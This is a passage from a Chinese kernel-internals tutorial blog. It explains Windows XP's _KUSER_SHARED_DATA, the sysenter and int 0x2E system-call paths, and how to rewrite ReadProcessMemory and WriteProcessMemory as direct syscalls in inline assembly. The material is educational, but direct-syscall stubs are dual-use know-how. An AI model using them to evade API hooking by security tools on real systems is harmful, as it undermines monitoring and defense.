class="line">.text:<span class="number">7</span>C92D9EC _NtReadVirtualMemory@<span class="number">20</span> endp</span><br></pre></td></tr></table></figure>

<p>可以看到在这里调用了一个地址：<code>0x7FFE0300</code>（其中eax存的值为系统服务号，即一个0环函数的编号），具体该地址是什么函数需要学习下一节。</p>
<h3 id="2-2-KUSER-SHARED-DATA结构"><a href="#2-2-KUSER-SHARED-DATA结构" class="headerlink" title="2.2 _KUSER_SHARED_DATA结构"></a>2.2 _KUSER_SHARED_DATA结构</h3><mark class="label danger">_KUSER_SHARED_DATA</mark>结构为一块3环和0环共享的内存块<mark class="label primary">（共享同一个物理页）</mark>。

<div class="note success"><ol>
<li>在 User 层和 Kernel 层分别定义了一个<code>_KUSER_SHARED_DATA</code>结构区域，用于 User 层和 Kernel 层共享某些数据。</li>
<li>它们使用固定的地址值映射，<code>_KUSER_SHARED_DATA</code>结构区域在 User 和 Kernel 层地址分别为：<ul>
<li>User 层地址为：<mark class="label warning">0x7FFE0000</mark>   只读</li>
<li>Kernnel 层地址为：<mark class="label success">0xFFDF0000</mark>   可读可写</li>
</ul>
</li>
</ol>
</div>

<p><strong>特别说明：</strong>虽然指向的是同一个物理页，但<strong>在User 层是只读</strong>的，<strong>在Kernnel层是可读可写</strong>的。同一个物理页映射了两个线性地址，这两个线性地址的对应的访问权限不同。（PDE、PTE的R&#x2F;W位），使用<code>dd 0x7FFE0000</code>和<code>dd 0xFFDF0000</code>里面的数据是一样的。</p>
<p>该结构如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _KUSER_SHARED_DATA <span class="number">0x7FFE0000</span></span><br><span class="line">ntdll!_KUSER_SHARED_DATA</span><br><span class="line">   +<span class="number">0x000</span> TickCountLow     : <span class="number">0x1572</span></span><br><span class="line">   +<span class="number">0x004</span> TickCountMultiplier : <span class="number">0xfa00000</span></span><br><span class="line">   +<span class="number">0x008</span> InterruptTime    : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x014</span> SystemTime       : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x020</span> TimeZoneBias     : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x02c</span> ImageNumberLow   : <span class="number">0x14c</span></span><br><span class="line">   +<span class="number">0x02e</span> ImageNumberHigh  : <span class="number">0x14c</span></span><br><span class="line">   +<span class="number">0x030</span> NtSystemRoot     : [<span class="number">260</span>] <span class="number">0x43</span></span><br><span class="line">   +<span class="number">0x238</span> MaxStackTraceDepth : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x23c</span> CryptoExponent   : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x240</span> TimeZoneId       : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x244</span> Reserved2        : [<span class="number">8</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x264</span> NtProductType    : <span class="number">1</span> ( NtProductWinNt )</span><br><span class="line">   +<span class="number">0x268</span> ProductTypeIsValid : <span class="number">0x1</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0x26c NtMajorVersion   : 5</span><br><span class="line">   +<span class="number">0x270</span> NtMinorVersion   : <span class="number">1</span></span><br><span class="line">   +<span class="number">0x274</span> ProcessorFeatures : [<span class="number">64</span>]  <span class="string">&quot;&quot;</span></span><br><span class="line">   +<span class="number">0x2b4</span> Reserved1        : <span class="number">0x7ffeffff</span></span><br><span class="line">   +<span class="number">0x2b8</span> Reserved3        : <span class="number">0x80000000</span></span><br><span class="line">   +<span class="number">0x2bc</span> TimeSlip         : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x2c0</span> AlternativeArchitecture : <span class="number">0</span> ( StandardDesign )</span><br><span class="line">   +<span class="number">0x2c8</span> SystemExpirationDate : _LARGE_INTEGER <span class="number">0x0</span></span><br><span class="line">   +<span class="number">0x2d0</span> SuiteMask        : <span class="number">0x110</span></span><br><span class="line">   +<span class="number">0x2d4</span> KdDebuggerEnabled : <span class="number">0x3</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0x2d5 NXSupportPolicy  : 0x2 &#x27;&#x27;</span><br><span class="line">   +<span class="number">0x2d8</span> ActiveConsoleId  : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x2dc</span> DismountCount    : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x2e0</span> ComPlusPackage   : <span class="number">0xffffffff</span></span><br><span class="line">   +<span class="number">0x2e4</span> LastSystemRITEventTickCount : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x2e8</span> NumberOfPhysicalPages : <span class="number">0x3ff77</span></span><br><span class="line">   +<span class="number">0x2ec</span> SafeBootMode     : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0x2f0 TraceLogging     : 0</span><br><span class="line">   +<span class="number">0x2f8</span> TestRetInstruction : <span class="number">0xc3</span></span><br><span class="line">   +<span class="number">0x300</span> SystemCall       : <span class="number">0x7c92e4f0</span></span><br><span class="line">   +<span class="number">0x304</span> SystemCallReturn : <span class="number">0x7c92e4f4</span></span><br><span class="line">   +<span class="number">0x308</span> SystemCallPad    : [<span class="number">3</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x320</span> TickCount        : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x320</span> TickCountQuad    : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x330</span> Cookie           : <span class="number">0x83dcba5</span></span><br></pre></td></tr></table></figure>

<p>在偏移<code>0x300</code>的地方即为<code>NtReadVirtualMemory</code>函数调用的<code>0x7FFE0300</code>处的函数，为一个<code>SystemCall</code>（系统调用函数）。该函数但汇编代码为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; u <span class="number">0x7c92e4f0</span></span><br><span class="line">ntdll!KiFastSystemCall:</span><br><span class="line"><span class="number">7</span>c92e4f0 <span class="number">8b</span>d4            mov     edx,esp</span><br><span class="line"><span class="number">7</span>c92e4f2 <span class="number">0f</span>34            sysenter</span><br><span class="line">ntdll!KiFastSystemCallRet:</span><br><span class="line"><span class="number">7</span>c92e4f4 c3              ret</span><br><span class="line"><span class="number">7</span>c92e4f5 <span class="number">8</span>da42400000000  lea     esp,[esp]</span><br><span class="line"><span class="number">7</span>c92e4fc <span class="number">8</span>d642400        lea     esp,[esp]</span><br><span class="line">ntdll!KiIntSystemCall:</span><br><span class="line"><span class="number">7</span>c92e500 <span class="number">8</span>d542408        lea     edx,[esp+<span class="number">8</span>]</span><br><span class="line"><span class="number">7</span>c92e504 cd2e            <span class="keyword">int</span>     <span class="number">2</span>Eh</span><br><span class="line"><span class="number">7</span>c92e506 c3              ret</span><br></pre></td></tr></table></figure>

<p>可以看到该函数使用了指令<code>sysenter</code>进入到0环，同时EDX指向栈顶。该指令具体的实现请看下一节。</p>
<h3 id="2-3-SystemCall"><a href="#2-3-SystemCall" class="headerlink" title="2.3 SystemCall"></a>2.3 SystemCall</h3><p><strong>SystemCall</strong>是两个能从3环进入到0环的函数的名称。系统调用有<strong>中断调用</strong>和<strong>快速调用</strong>两种方式，中断调用是通过<mark class="label success">中断门</mark>进0环，此过程需要查IDT表和TSS表；快速调用则是使用<mark class="label warning">sysenter</mark>指令进0环，这种方式不需要查内存，而是直接从CPU的<strong>MSR寄存器</strong>中获取所需数据，所以称为快速调用。</p>
<div class="note info"><p>怎么判断系统是否支持快速调用？<br>当通过 <mark class="label danger">eax &#x3D; 1</mark> 来执行<code>cpuid</code>指令时，处理器的特征信息被放在 <mark class="label default">ecx</mark> 和 <mark class="label default">edx</mark> 寄存器中，其中edx包含了一个SEP位（EDX值的第12位，下标为11），该位指明了当前处理器知否支持<code>sysenter/sysexit</code>指令（SEP &#x3D;&#x3D; 1，支持）</p>
<ul>
<li>SEP &#x3D;&#x3D; 1，支持。SystemCall为：<br><code>ntdll.dll!KiFastSystemCall()</code></li>
<li>SEP &#x3D;&#x3D; 0，不支持。SystemCall为：<br><code>ntdll.dll!KiIntSystemCall()</code></li>
</ul>
</div>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ntdll!KiFastSystemCall:</span><br><span class="line"><span class="number">7</span>c92e4f0 <span class="number">8b</span>d4            mov     edx,esp</span><br><span class="line"><span class="number">7</span>c92e4f2 <span class="number">0f</span>34            sysenter</span><br><span class="line">  </span><br><span class="line">ntdll!KiIntSystemCall:</span><br><span class="line"><span class="number">7</span>c92e500 <span class="number">8</span>d542408        lea     edx,[esp+<span class="number">8</span>]</span><br><span class="line"><span class="number">7</span>c92e504 cd2e            <span class="keyword">int</span>     <span class="number">2</span>Eh</span><br><span class="line"><span class="number">7</span>c92e506 c3              ret</span><br></pre></td></tr></table></figure>



<p>实验：</p>
<p>将eax &#x3D; 1，ecx &#x3D; 0、edx &#x3D; 0，执行<code>cpuid</code>指令前：</p>
<p><img data-src="https://s2.loli.net/2022/01/26/ItuSlcjqzDEWH7e.png" alt="2.png"></p>
<p>执行<code>cpuid</code>指令后如下图，edx &#x3D; 0x1F8BFBFF，B &#x3D; <strong>1</strong>011，第12位为1，说明支持快速调用。</p>
<p><img data-src="https://s2.loli.net/2022/01/26/Dg8BRmF7kTw1UrV.png" alt="3.png"></p>
<div class="note primary"><p>关于<code>KiFastSystemCall()</code>和<code>KiIntSystemCall()</code>这两个函数：</p>
<ol>
<li><strong>这两个函数都叫做SystemCall</strong>。如果系统支持快速调用，就会把KiFastSystemCall()函数的地址写到0x7FFE0300处。不支持就会把KiIntSystemCall()的函数地址写到0x7FFE0300处。</li>
<li>这两个函数的相同点：都是找新的CS、SS、ESP、EIP。不同点：找的方式不同。</li>
</ol>
</div>

<h3 id="2-4-3环进0环需要更改的4个寄存器"><a href="#2-4-3环进0环需要更改的4个寄存器" class="headerlink" title="2.4 3环进0环需要更改的4个寄存器"></a>2.4 3环进0环需要更改的4个寄存器</h3><p><strong>3环进0环需要更改哪些寄存器？</strong></p>
<ol>
<li>CS的权限由3变为0 ，意味着需要新的<strong>CS</strong>。</li>
<li>SS与CS的权限永远一致，需要新的<strong>SS</strong>。</li>
<li>权限发生切换的时候，堆栈也一定会切换，需要新的<strong>ESP</strong>。</li>
</ol>
<ol start="4">
<li>进0环后代码的位置，需要新的<strong>EIP</strong>。</li>
</ol>
<p>简单复习一下，中断门进0环时，我们在IDT表里填的中断门描述符，然后根据中断门描述符中的段选择子找到一个代码段描述符去提权，包含了0环的CS和EIP，而SS和0环的ESP是在TSS里存储的，当时我们还有一个结论，Windows里不使用任务，所以TSS的唯一作用就是提权时提供ESP0、SS0和EIP。</p>
<p>现在，我们知道了进0环需要更改的4个寄存器，接下来分析 KiFastSystemCall 和 KiIntSystemCall 时，只要明白一点，这两个函数做的事情就是更改这4个寄存器。</p>
<h3 id="2-4-重写ReadProcessMemory和WriteProcessMemory"><a href="#2-4-重写ReadProcessMemory和WriteProcessMemory" class="headerlink" title="2.4 重写ReadProcessMemory和WriteProcessMemory"></a>2.4 重写ReadProcessMemory和WriteProcessMemory</h3><div class="note danger"><p><strong>重写API最重要的六点：</strong></p>
<ol>
<li>进0环前函数服务号。</li>
<li>进0环的方式（中断门&#x2F;快速调用）。</li>
<li>进0环前寄存器的值（EAX、EDX）。</li>
<li>进0环前堆栈的值。<ul>
<li><strong>中断门进入0环时：</strong>中断门本身会将SS3、ESP3、EFLAG3、CS3、返回地址压栈，故不需要考虑堆栈恢复（被调用的API会自己POP返回地址）。</li>
<li><strong>快速调用进入0环时：</strong>需要自己压栈返回地址，且该<mark class="label danger">返回地址要紧挨着原来的参数</mark>，EBP指向的位置应该是第二个返回地址的坑，需要先将里面的值保存起来，还要保存起来原来的ESP，实际上就是在<mark class="label success">模拟中断门保存ESP和返回地址</mark>。</li>
</ul>
</li>
<li>进0环前返回地址。</li>
<li>大部分API调用约定都是<code>__stdcall</code>，被调用的API会自己平衡压入参数的堆栈。</li>
</ol>
</div>

<ol>
<li>服务号：函数服务号 &#x3D; 0xBA；</li>
<li>进0环的方式：<ul>
<li>中断门<code>int 0x2e</code>：EAX &#x3D; 服务号 &#x3D; 0xBA、EDX &#x3D; 第一个参数<strong>的地址</strong>。</li>
<li>快速调用<code>sysenter</code>：EAX &#x3D; 服务号 &#x3D; 0xBA。EDX &#x3D; 返回地址<strong>的地址</strong>。</li>
</ul>
</li>
<li>寄存器的值：第2点中所述。</li>
<li>进0环前堆栈的值：本函数仅需注意函数的返回地址。</li>
<li>返回地址：中断门无需提供返回地址（返回地址被压栈）、<mark class="label warning">快速调用需要自己压栈返回地址</mark>，且该返回地址要紧挨着原来的参数，EBP指向的坑需要放入当前的返回地址，原来的值需要先保存起来，还要保存起来原来的ESP，实际上就是在<strong>模拟中断门保存ESP和返回地址</strong>。。</li>
<li>注入函数的堆栈平衡。</li>
</ol>
<p>重写ReadProcessMemory，分析：</p>
<p>先观察原来API调用的堆栈变化：</p>
<p><img data-src="https://s2.loli.net/2022/01/28/Mh3xgeUdlaZW1Km.png" alt="7.png"></p>
<p>可以看到，在函数<code>ReadProcessMemory(x,x,x,x)</code>中重新把自己的参数压栈了一次，目的是调用<code>NtReadVirtualMemory(x,x,x,x,x)</code>，然后调用一次函数压栈一次返回地址，总共调用了两次函数。所以自己重写API时，要让两个返回地址紧挨着堆栈里的参数。</p>
<p>如下代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//模拟中断门调用，保存esp和返回地址</span></span><br><span class="line">		mov eax,[ebp];	<span class="comment">//ebp的坑应该是第二个函数返回地址，里面的值需要先保存起来</span></span><br><span class="line">		mov dwRet,eax;</span><br><span class="line">		mov dwESP,esp;	<span class="comment">//esp的值也需要保存起来</span></span><br><span class="line"></span><br><span class="line">		mov eax,<span class="number">0xBA</span>;	<span class="comment">//设置系统服务号</span></span><br><span class="line">		lea ebx, NtReadVirtualMemoryRet;<span class="comment">//call KiFastSystemCall的返回地址</span></span><br><span class="line">		mov [ebp],ebx;	<span class="comment">//把新的返回地址填到返回地址的坑</span></span><br><span class="line">		mov edx,ebp;	<span class="comment">//edx = 返回地址的地址</span></span><br><span class="line">		_emit <span class="number">0x0F</span>;	<span class="comment">//sysenter </span></span><br><span class="line">		_emit <span class="number">0x34</span>;</span><br><span class="line">NtReadVirtualMemoryRet:</span><br><span class="line">		mov ntStatus,eax;<span class="comment">//函数返回值</span></span><br><span class="line">		mov esp,dwESP;</span><br><span class="line">		mov eax,dwRet;</span><br><span class="line">		mov [ebp],eax;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>进入上面的函数时，堆栈情况如下：故当前EBP指向的位置（坑）需要放入第二个返回地址，需要先将里面的值保存起来，从0环返回时恢复。由于快速调用返回时ESP会变化，故ESP的值也需要保存起来（有必要时EBP的值也需要保存起来）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Debug模式下该函数的反汇编代码：</span><br><span class="line"><span class="number">004010</span>C0   push        ebp</span><br><span class="line"><span class="number">004010</span>C1   mov         ebp,esp</span><br><span class="line"><span class="number">004010</span>C3   sub         esp,<span class="number">4</span>Ch</span><br><span class="line"><span class="number">004010</span>C6   push        ebx</span><br><span class="line"><span class="number">004010</span>C7   push        esi</span><br><span class="line"><span class="number">004010</span>C8   push        edi</span><br><span class="line"><span class="number">004010</span>C9   lea         edi,[ebp<span class="number">-4</span>Ch]</span><br><span class="line"><span class="number">004010</span>CC   mov         ecx,<span class="number">13</span>h</span><br><span class="line"><span class="number">004010</span>D1   mov         eax,<span class="number">0</span>CCCCCCCCh</span><br><span class="line"><span class="number">004010</span>D6   rep stos    dword ptr [edi]</span><br><span class="line">  ...</span><br><span class="line">此时的堆栈情况：</span><br><span class="line"><span class="number">0012F</span>ECC  <span class="number">80</span> FF <span class="number">12</span> <span class="number">00</span>  ....	&lt;--EBP</span><br><span class="line"><span class="number">0012F</span>ED0  <span class="number">65</span> E2 <span class="number">40</span> <span class="number">00</span>  e.@.	&lt;--EBP+<span class="number">4</span>返回地址</span><br><span class="line"><span class="number">0012F</span>ED4  FF FF FF FF  ....	&lt;--参数<span class="number">1</span></span><br><span class="line"><span class="number">0012F</span>ED8  <span class="number">64</span> FF <span class="number">12</span> <span class="number">00</span>  d...	&lt;--参数<span class="number">2</span></span><br><span class="line"><span class="number">0012F</span>EDC  <span class="number">38</span> FF <span class="number">12</span> <span class="number">00</span>  <span class="number">8.</span>..	&lt;--参数<span class="number">3</span></span><br><span class="line"><span class="number">0012F</span>EE0  <span class="number">18</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ....	&lt;--参数<span class="number">4</span></span><br><span class="line"><span class="number">0012F</span>EE4  <span class="number">7</span>C FF <span class="number">12</span> <span class="number">00</span>  |...	&lt;--参数<span class="number">5</span></span><br><span class="line"><span class="number">0012F</span>EE8  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ....</span><br><span class="line"><span class="number">0012F</span>EEC  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ....</span><br></pre></td></tr></table></figure>

<p>总结有：快速调用需要保存原来的ESP、返回地址（<strong>模拟中断门调用</strong>）。</p>
<p>注意，VC、VS内联汇编不支持<code>sysenter</code>指令，可以用<code>_emit</code>代替。</p>
<p>对<code>WriteProcessMemory</code>逆向分析可知，会先调用<code>NtProtectVirtualMemory(x,x,x,x,x)</code>对要写的内存进行权限检查等工作，如果可写就会调用<code>__imp__NtWriteVirtualMemory@20 ; NtWriteVirtualMemory(x,x,x,x,x)</code>进行内存写入。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">7</span>C92DF90 ; <span class="function">__stdcall <span class="title">NtWriteVirtualMemory</span><span class="params">(x, x, x, x, x)</span></span></span><br><span class="line">.text:7C92DF90                 public _NtWriteVirtualMemory@20</span><br><span class="line">.text:<span class="number">7</span>C92DF90 _NtWriteVirtualMemory@<span class="number">20</span> proc near      ; CODE XREF: RtlInitializeContext(x,x,x,x,x)+AA↓p</span><br><span class="line">.text:<span class="number">7</span>C92DF90                                         ; RtlCreateUserProcess(x,x,x,x,x,x,x,x,x,x)+<span class="number">1F</span>2↓p ...</span><br><span class="line">.text:<span class="number">7</span>C92DF90                 mov     eax, <span class="number">115</span>h       ; NtWriteVirtualMemory</span><br><span class="line">.text:<span class="number">7</span>C92DF95                 mov     edx, <span class="number">7F</span>FE0300h</span><br><span class="line">.text:<span class="number">7</span>C92DF9A                 call    dword ptr [edx]</span><br><span class="line">.text:<span class="number">7</span>C92DF9C                 retn    <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">7</span>C92DF9C _NtWriteVirtualMemory@<span class="number">20</span> endp</span><br></pre></td></tr></table></figure>

<p>重写实现代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 读进程内存（中断门调用）</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">ReadProcessMemory_INT</span><span class="params">(HANDLE hProcess, </span></span></span><br><span class="line"><span class="function"><span class="params">                                  LPCVOID lpBaseAddress, </span></span></span><br><span class="line"><span class="function"><span class="params">                                  LPVOID lpBuffer, </span></span></span><br><span class="line"><span class="function"><span class="params">                                  DWORD nSize, </span></span></span><br><span class="line"><span class="function"><span class="params">                                  LPDWORD lpNumberOfBytesRead</span></span></span><br><span class="line"><span class="function"><span class="params">                                 )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD NtStatus;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 直接模拟 KiIntSystemCall</span></span><br><span class="line">		lea edx,hProcess; <span class="comment">// 要求 edx 存储最后入栈的参数</span></span><br><span class="line">		mov eax, <span class="number">0xBA</span>;</span><br><span class="line">		<span class="keyword">int</span> <span class="number">0x2E</span>;</span><br><span class="line">		mov NtStatus, eax;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (lpNumberOfBytesRead != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		*lpNumberOfBytesRead = nSize;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 错误检查</span></span><br><span class="line">	<span class="keyword">if</span> (NtStatus &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读进程内存（快速调用）</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">ReadProcessMemory_FAST</span><span class="params">(HANDLE hProcess, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   LPCVOID lpBaseAddress, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   LPVOID lpBuffer, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   DWORD nSize, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   LPDWORD lpNumberOfBytesRead</span></span></span><br><span class="line"><span class="function"><span class="params">                                  )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD ntStatus;</span><br><span class="line">	DWORD dwRet;</span><br><span class="line">	DWORD dwESP;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">    <span class="comment">//模拟中断门调用，保存esp和返回地址</span></span><br><span class="line">		mov eax,[ebp];	<span class="comment">//ebp的坑应该是第二个函数返回地址，里面的值需要先保存起来</span></span><br><span class="line">		mov dwRet,eax;</span><br><span class="line">		mov dwESP,esp;	<span class="comment">//esp的值也需要保存起来</span></span><br><span class="line"></span><br><span class="line">		mov eax,<span class="number">0xBA</span>;	<span class="comment">//设置系统服务号</span></span><br><span class="line">		lea ebx, NtReadVirtualMemoryRet;<span class="comment">//call KiFastSystemCall的返回地址</span></span><br><span class="line">		mov [ebp],ebx;	<span class="comment">//把新的返回地址填到返回地址的坑</span></span><br><span class="line">		mov edx,ebp;	<span class="comment">//edx = 返回地址的地址</span></span><br><span class="line">		_emit <span class="number">0x0F</span>;	<span class="comment">//sysenter </span></span><br><span class="line">		_emit <span class="number">0x34</span>;</span><br><span class="line">NtReadVirtualMemoryRet:</span><br><span class="line">		mov ntStatus,eax;<span class="comment">//函数返回值</span></span><br><span class="line">		mov esp,dwESP;	<span class="comment">//恢复esp</span></span><br><span class="line">		mov eax,dwRet;</span><br><span class="line">		mov [ebp],eax;	<span class="comment">//恢复原来的ebp坑里面的值</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (lpNumberOfBytesRead != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		*lpNumberOfBytesRead = nSize;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 错误检查</span></span><br><span class="line">	<span class="keyword">if</span> (ntStatus &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写进程内存（中断门调用）</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">WriteProcessMemory_INT</span><span class="params">(HANDLE hProcess, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   LPCVOID lpBaseAddress, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   LPVOID lpBuffer, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   DWORD nSize, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   LPDWORD </span></span></span><br><span class="line"><span class="function"><span class="params">                                   lpNumberOfBytesRead</span></span></span><br><span class="line"><span class="function"><span class="params">                                  )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LONG NtStatus;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 直接模拟 KiIntSystemCall</span></span><br><span class="line">		lea edx,hProcess; <span class="comment">// 要求 edx 存储最后入栈的参数</span></span><br><span class="line">		mov eax, <span class="number">0x115</span>;</span><br><span class="line">		<span class="keyword">int</span> <span class="number">0x2E</span>;</span><br><span class="line">		mov NtStatus, eax;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (lpNumberOfBytesRead != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		*lpNumberOfBytesRead = nSize;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 错误检查</span></span><br><span class="line">	<span class="keyword">if</span> (NtStatus &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读进程内存（快速调用）</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">WriteProcessMemory_FAST</span><span class="params">(HANDLE hProcess, </span></span></span><br><span class="line"><span class="function"><span class="params">                                    LPCVOID lpBaseAddress, </span></span></span><br><span class="line"><span class="function"><span class="params">                                    LPVOID lpBuffer, </span></span></span><br><span class="line"><span class="function"><span class="params">                                    DWORD nSize, </span></span></span><br><span class="line"><span class="function"><span class="params">                                    LPDWORD lpNumberOfBytesRead</span></span></span><br><span class="line"><span class="function"><span class="params">                                   )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD ntStatus;</span><br><span class="line">	DWORD dwRet;</span><br><span class="line">	DWORD dwESP;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov eax,[ebp];	<span class="comment">//ecx保存上一个函数的返回地址</span></span><br><span class="line">		mov dwRet,eax;</span><br><span class="line">		mov dwESP,esp;</span><br><span class="line"></span><br><span class="line">		mov eax,<span class="number">0x115</span>;	<span class="comment">//设置系统服务号</span></span><br><span class="line">		lea ebx, NtWriteVirtualMemoryRet;<span class="comment">//call KiFastSystemCall的返回地址</span></span><br><span class="line">		mov [ebp],ebx;	<span class="comment">//把新的返回地址填到返回地址的坑</span></span><br><span class="line">		mov edx,ebp;	<span class="comment">//edx = 返回地址的地址</span></span><br><span class="line">		_emit <span class="number">0x0F</span>;	<span class="comment">//sysenter </span></span><br><span class="line">		_emit <span class="number">0x34</span>;</span><br><span class="line">NtWriteVirtualMemoryRet:</span><br><span class="line">		mov ntStatus,eax;<span class="comment">//函数返回值</span></span><br><span class="line">		mov esp,dwESP;</span><br><span class="line">		mov eax,dwRet;</span><br><span class="line">		mov [ebp],eax;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (lpNumberOfBytesRead != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		*lpNumberOfBytesRead = nSize;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 错误检查</span></span><br><span class="line">	<span class="keyword">if</span> (ntStatus &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwReadLen = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> szRead[] = &#123;<span class="string">&quot;This is Test Read Data.&quot;</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> szWrite[] = &#123;<span class="string">&quot;Write Data.&quot;</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> szBufferRead[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;原数据为：%s\n&quot;</span>,szRead);</span><br><span class="line">	ReadProcessMemory_FAST(GetCurrentProcess(),(LPCVOID)szRead,szBufferRead,<span class="keyword">sizeof</span>(szRead),&amp;dwReadLen);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;FASTCALL调用方式读取的数据为：%s\n&quot;</span>,szBufferRead);</span><br><span class="line">	<span class="built_in">memset</span>(szBufferRead,<span class="number">0</span>,<span class="keyword">sizeof</span>(szBufferRead));</span><br><span class="line">	ReadProcessMemory_INT(GetCurrentProcess(),(LPCVOID)szRead,szBufferRead,<span class="keyword">sizeof</span>(szRead),&amp;dwReadLen);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;INT调用方式读取的数据为：%s\n&quot;</span>,szBufferRead);</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;写入的数据为：%s\n&quot;</span>,szWrite);</span><br><span class="line">	WriteProcessMemory_INT(GetCurrentProcess(),(LPCVOID)((DWORD)szRead+<span class="number">4</span>),szWrite,<span class="keyword">sizeof</span>(szWrite),&amp;dwReadLen);</span><br><span class="line">	ReadProcessMemory_FAST(GetCurrentProcess(),(LPCVOID)szRead,szBufferRead,<span class="keyword">sizeof</span>(szRead),&amp;dwReadLen);</span><br><span class="line">	<span class="built_in">printf</span>(<span 